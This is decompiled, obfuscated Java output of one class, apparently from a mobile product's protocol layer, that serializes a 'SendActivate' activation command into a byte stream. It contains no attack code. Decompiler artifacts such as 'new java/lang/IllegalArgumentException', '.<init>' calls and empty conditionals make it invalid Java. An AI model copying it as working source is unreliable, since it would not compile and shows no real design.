package com.vvt.phoenix.prot.databuilder;

import com.vvt.phoenix.a.b;
import com.vvt.phoenix.prot.a.e;
import java.io.OutputStream;

public class w
  extends r
{
  private static final boolean a;
  
  static
  {
    boolean bool = com.vvt.phoenix.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      return;
    }
  }
  
  protected OutputStream a(OutputStream paramOutputStream)
  {
    short s = 2;
    boolean bool = a;
    if (bool) {}
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a(s);
    paramOutputStream.write(arrayOfByte, 0, s);
    bool = a;
    if (bool) {}
    return paramOutputStream;
  }
  
  protected String a()
  {
    return "SendActivatePayloadBuilder";
  }
  
  protected OutputStream b(OutputStream paramOutputStream)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = c();
    bool = localObject instanceof com.vvt.phoenix.prot.command.r;
    IllegalArgumentException localIllegalArgumentException;
    if (bool)
    {
      localObject = e.a((com.vvt.phoenix.prot.command.r)c());
      localIllegalArgumentException = null;
      int i = localObject.length;
      paramOutputStream.write((byte[])localObject, 0, i);
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return paramOutputStream;
      localObject = a();
      localIllegalArgumentException = new java/lang/IllegalArgumentException;
      String str = "Command data is not an instance of SendActivate";
      localIllegalArgumentException.<init>(str);
      b.a((String)localObject, localIllegalArgumentException);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/databuilder/w.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */